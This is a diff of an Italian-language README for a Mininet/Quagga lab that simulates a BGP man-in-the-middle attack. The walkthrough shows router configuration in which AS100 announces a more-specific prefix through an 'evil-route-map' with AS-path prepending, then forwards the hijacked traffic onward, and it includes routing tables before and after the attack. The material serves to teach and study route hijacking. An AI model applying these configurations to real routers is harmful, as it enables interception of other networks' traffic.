@@ -1,12 +1,10 @@
 # bgp-man-in-the-middle
 
-Base code available here: https://bitbucket.org/jvimal/bgp
-
-Attack description available here: https://www.defcon.org/images/defcon-16/dc16-presentations/defcon-16-pilosov-kapela.pdf
+Descrizione dell'attacco disponibile qui: https://www.defcon.org/images/defcon-16/dc16-presentations/defcon-16-pilosov-kapela.pdf
 
 ---
 
-## Mininet preparation
+## Preparazione Mininet
 
 - `git clone https://github.com/mininet/mininet`
 
@@ -20,15 +18,15 @@ Attack description available here: https://www.defcon.org/images/defcon-16/dc16-
 
 - `mn --version`
 
-## Quagga preparation
+## Preparazione Quagga
 
-- download quagga-1.2.4 from [here](http://download.savannah.gnu.org/releases/quagga/) in your `$HOME` and extract it
+- esegui il download quagga-1.2.4 da [qui](http://download.savannah.gnu.org/releases/quagga/) nella tua `$HOME` ed estrai il file compresso
 
 - `cd ~/quagga-1.2.4`
 
 - `chown mininet:mininet /var/run/quagga`
 
-- edit `configure` file, add `${quagga_statedir_prefix}/var/run/quagga` before all options in `QUAGGA_STATE_DIR` for loop 
+- modifica il file `configure`, aggiungendo `${quagga_statedir_prefix}/var/run/quagga` prima di tutte le opzioni nel loop `for` per `QUAGGA_STATE_DIR`
 
 - `./configure --enable-user=mininet --enable-group=mininet`
 
@@ -36,174 +34,170 @@ Attack description available here: https://www.defcon.org/images/defcon-16/dc16-
 
 ---
 
-## Attack execution
-
-\#TODO
-
-<!--
+## Esecuzione dell'attacco
 
 Per provare la simulazione, seguiamo i seguenti passi.
 
-**1. Avviamo l'ambiente di simulazione.**
+**. Avviamo l'ambiente di simulazione.**
 
 Avviamo le istanze dei router, degli AS e degli host eseguendo il comando.
 
 `$ python bgp.py`
 
-L'output sarà simile al seguente.
+**. Accediamo al daemon bgp.**
 
-```
-*** Creating network
-*** Adding controller
-*** Adding hosts:
-h1-1 h1-2 h1-3 h2-1 h2-2 h2-3 h3-1 h3-2 h3-3 h4-1 h4-2 h4-3 
-*** Adding switches:
-R1 R2 R3 R4 
-*** Adding links:
-(R1, R2) (R1, R4) (R1, h1-1) (R1, h1-2) (R1, h1-3) (R2, R3) (R2, h2-1) (R2, h2-2) (R2, h2-3) (R3, h3-1) (R3, h3-2) (R3, h3-3) (R4, h4-1) (R4, h4-2) (R4, h4-3) 
-*** Configuring hosts
-h1-1 h1-2 h1-3 h2-1 h2-2 h2-3 h3-1 h3-2 h3-3 h4-1 h4-2 h4-3 
-*** Starting controller
-*** Starting 4 switches
-R1 R2 R3 R4 
-Waiting 3 seconds for sysctl changes to take effect...
-Starting zebra and bgpd on R1
-Starting zebra and bgpd on R2
-Starting zebra and bgpd on R3
-Starting web servers
-*** Starting CLI:
-mininet> 
-```
+In un altro terminale avviamo una sessione con il daemon bgp dell'AS100. La password per accedere come utente è `en`. 
 
-**2. Accediamo al deamon di routing.**
-
-In un altro terminale avviamo una sessione con il deamon di routing dell'AS1. La password per accedere come utente è `en`. 
-
-`$ ./connect.sh`
-
-L'output sarà simile al seguente.
-
-```
-Connecting to R1 shell
-Trying ::1...
-Connected to localhost.
-Escape character is '^]'.
-
-Hello, this is Quagga (version 0.99.22.4).
-Copyright 1996-2005 Kunihiro Ishiguro, et al.
-
-
-User Access Verification
-
-Password: 
-```
+`$ ./connect-bgp.sh`
 
 Per accedere alla shell di amministratore lanciamo il comando `en`; la password di accesso è `en`.
 
 ```
-bgpd-R1> en
+bgpd-R100> en
 Password: 
-bgpd-R1# 
+bgpd-R100# 
 ```
 
-**3. Controlliamo la routing table.**
+**. Controlliamo la routing table.**
 
-Verifichiamo le entry di routing nell'AS1. Lanciamo il comando:
+Verifichiamo le entry di routing nell'AS100. Lanciamo il comando:
 
-`bgpd-R1# sh ip bgp`
+`bgpd-R100# show ip bgp`
 
-L'output sarà simile al seguente.
+Output
 
-```
-BGP table version is 0, local router ID is 9.0.0.1
-Status codes: s suppressed, d damped, h history, * valid, > best, i - internal,
-              r RIB-failure, S Stale, R Removed
-Origin codes: i - IGP, e - EGP, ? - incomplete
+	BGP table version is 0, local router ID is 100.100.100.100
+	Status codes: s suppressed, d damped, h history, * valid, > best, = multipath,
+	              i internal, r RIB-failure, S Stale, R Removed
+	Origin codes: i - IGP, e - EGP, ? - incomplete
+	
+	   Network          Next Hop            Metric LocPrf Weight Path
+	*> 10.10.0.0/22     10.10.110.1              0             0 10 i
+	*  10.20.0.0/22     10.10.140.1                            0 40 30 200 20 i
+	*>                  10.10.110.1                            0 10 20 i
+	*  10.30.0.0/22     10.10.110.1                            0 10 20 200 30 i
+	*>                  10.10.140.1                            0 40 30 i
+	*> 10.40.0.0/22     10.10.140.1              0             0 40 i
+	*> 10.100.0.0/22    0.0.0.0                  0         32768 i
+	*  10.200.0.0/22    10.10.110.1                            0 10 20 200 i
+	*>                  10.10.140.1                            0 40 30 200 i
+	
+	Displayed  6 out of 9 total prefixes
 
-   Network          Next Hop            Metric LocPrf Weight Path
-*> 11.0.0.0         0.0.0.0                  0         32768 i
-*> 12.0.0.0         9.0.0.2                  0             0 2 i
-*> 13.0.0.0         9.0.0.2                                0 2 3 i
+Dall'output riusciamo a capire se l'AS100 per raggiungere la rete 10.200.0.0/22 sceglie il path "10 20 200" (caso 1) oppure il path "40 30 200" (caso 2). In questo caso ricadiamo nel caso 1.
 
-Total number of prefixes 3
-```
+**. Accediamo al daemon zebra.**
 
-Vediamo che l'AS1 raggiunge la rete 13.0.0.0/8 tramite il path "2 3", cioè attraversando AS2 e poi AS3.
+In un altro terminale avviamo una sessione con il daemon zebra del R100. La password per accedere come utente è `en`. 
 
-**4. Visitiamo il web server.**
+`$ ./connect-zebra.sh`
 
-In un'altra finestra, visitiamo il server che mininet ha avviato nell'AS3 e verifichiamo che lo si possa raggiungere dall'host h1-1 connesso all'AS1. In questa fase lo script esegue il comando `curl -s 13.0.0.1` dall'host h1-1 in un ciclo. Lanciamo lo script.
-
-`$ ./website.sh`
-
-L'output sarà simile al seguente.
-
-```
-Fri May 18 02:30:35 PDT 2018 -- <h1>Default web server</h1>
-Fri May 18 02:30:36 PDT 2018 -- <h1>Default web server</h1>
-Fri May 18 02:30:37 PDT 2018 -- <h1>Default web server</h1>
-...
-```
-
-**5. Lanciamo l'attacco.**
-
-In un'altra finestra, avviamo l'AS attaccante. Esso si connetterà all'AS1 e diffonderà una rotta per 13.0.0.0/8 usando un path più corto. Quindi, l'AS1 sceglierà questo path. Lanciamo lo script:
-
-`$ ./start_rogue.sh`
-
-L'output sarà simile al seguente.
+Per accedere alla shell di amministratore lanciamo il comando `en`; la password di accesso è `en`.
 
 ```
-Killing any existing rogue AS
-Starting rogue AS
+R100> en
+Password: 
+R100# 
 ```
 
-Dopo un po' di tempo, a causa della convergenza del BGP, dovremmo vedere che l'output dello script `website.sh` cambia in questo modo.
+**. Controlliamo le rotte.**
 
-```
-...
-Fri May 18 02:36:45 PDT 2018 -- <h1>Default web server</h1>
-Fri May 18 02:36:46 PDT 2018 -- <h1>Default web server</h1>
-Fri May 18 02:36:47 PDT 2018 -- <h1>Default web server</h1>
-Fri May 18 02:36:48 PDT 2018 -- <h1>*** Attacker web server ***</h1>
-Fri May 18 02:36:49 PDT 2018 -- <h1>*** Attacker web server ***</h1>
-Fri May 18 02:36:50 PDT 2018 -- <h1>*** Attacker web server ***</h1>
-...
-```
+Verifichiamo le rotte selte da R100. Lanciamo il comando:
 
-Possiamo ricontrollare la tabella di routing usando la shell dell'AS1.
+`R100# show ip route`
 
-```
-BGP table version is 0, local router ID is 9.0.0.1
-Status codes: s suppressed, d damped, h history, * valid, > best, i - internal,
-              r RIB-failure, S Stale, R Removed
-Origin codes: i - IGP, e - EGP, ? - incomplete
+Output
 
-   Network          Next Hop            Metric LocPrf Weight Path
-*> 11.0.0.0         0.0.0.0                  0         32768 i
-*> 12.0.0.0         9.0.0.2                  0             0 2 i
-*> 13.0.0.0         9.0.4.2                  0             0 4 i
-*                   9.0.0.2                                0 2 3 i
+	Codes: K - kernel route, C - connected, S - static, R - RIP,
+	       O - OSPF, I - IS-IS, B - BGP, P - PIM, A - Babel, N - NHRP,
+	       > - selected route, * - FIB route
+	
+	B>* 10.10.0.0/22 [20/0] via 10.10.110.1, R100-eth2, 00:00:28
+	C>* 10.10.110.0/30 is directly connected, R100-eth2
+	C>* 10.10.140.0/30 is directly connected, R100-eth3
+	B>* 10.20.0.0/22 [20/0] via 10.10.110.1, R100-eth2, 00:00:25
+	B>* 10.30.0.0/22 [20/0] via 10.10.140.1, R100-eth3, 00:00:25
+	B>* 10.40.0.0/22 [20/0] via 10.10.140.1, R100-eth3, 00:00:28
+	C>* 10.100.0.0/24 is directly connected, R100-eth1
+	B>* 10.200.0.0/22 [20/0] via 10.10.110.1, R100-eth2, 00:00:22
+	C>* 127.0.0.0/8 is directly connected, lo
+	C>* 127.0.0.1/32 is directly connected, lo
 
-Total number of prefixes 3
-```
+Vediamo che per raggiungere la rete 10.200.0.0/22 R100 usa una rotta di tipo B - BGP passando attraverso l'AS10 (il dirimpettaio ha indirizzo IP 10.10.110.1)
 
-Vediamo che il path scelto per raggiungere 13.0.0.0/8 passa per AS4.
+**. Lanciamo l'attacco.**
 
-**6. Fermiamo l'ambiente di simulazione.**
+Nella shell bgp lanciamo i seguenti comandi (caso 1)
 
-Fermiamo l'attacco lanciando lo script.
+	configure terminal
+	
+	router bgp 100
+	   network 10.200.0.0/24
+	   neighbor 10.10.110.1 route-map evil-route-map out
+	   exit
+	ip prefix-list evil-prefix-list permit 10.200.0.0/24
+	route-map evil-route-map permit 10
+	   match ip address prefix-list evil-prefix-list
+	   set as-path prepend 10 20 200
+	   exit
 
-`$ ./stop_rogue.sh`
+oppure (caso 2)
 
-Fermiamo lo script che richiede la pagina web con Control-C.
+	configure terminal
+	router bgp 100
+	   network 10.200.0.0/24
+	   neighbor 10.10.140.1 route-map evil-route-map out
+	   exit
+	ip prefix-list evil-prefix-list permit 10.200.0.0/24
+	route-map evil-route-map permit 10
+	   match ip address prefix-list evil-prefix-list
+	   set as-path prepend 40 30 200
+	   exit
 
-Fermiamo il terminale connesso a R1.
+Nella shell zebra lanciamo i seguenti comandi (caso 1)
 
-`bgpd-R1# exit`
+	configure terminal
+	ip route 10.200.0.0/24 10.10.110.1
+	exit
+
+oppure (caso 2)
+
+	configure terminal
+	ip route 10.200.0.0/24 10.10.140.1
+	exit
+	
+**. Controlliamo le scelte di routing degli AS**
+
+Accediamo al daemon bgp di R40 e la sua routing table risulta
+
+	BGP table version is 0, local router ID is 40.40.40.40
+	Status codes: s suppressed, d damped, h history, * valid, > best, = multipath,
+	              i internal, r RIB-failure, S Stale, R Removed
+	Origin codes: i - IGP, e - EGP, ? - incomplete
+	
+	   Network          Next Hop            Metric LocPrf Weight Path
+	*> 10.10.0.0/22     10.10.140.2                            0 100 10 i
+	*  10.20.0.0/22     10.10.140.2                            0 100 10 20 i
+	*>                  10.10.70.1                             0 30 200 20 i
+	*> 10.30.0.0/22     10.10.70.1               0             0 30 i
+	*> 10.40.0.0/22     0.0.0.0                  0         32768 i
+	*> 10.100.0.0/22    10.10.140.2              0             0 100 i
+	*  10.200.0.0/22    10.10.140.2                            0 100 10 20 200 i
+	*>                  10.10.70.1                             0 30 200 i
+	*> 10.200.0.0/24    10.10.140.2              0             0 100 i
+	
+	Displayed  7 out of 9 total prefixes
+	
+Vediamo che R40 inoltrerà il traffico verso la rete 10.200.0.0/24 attraverso l'AS100 invece che attraverso l'AS30
+
+**. Fermiamo l'ambiente di simulazione.**
+
+Fermiamo il terminali connessi a R100.
+
+`bgpd-R100# exit`
+
+`R100# exit`
 
 Fermiamo le istanze digitando exit nel terminale di mininet.
 
 `mininet> exit`
-
--->
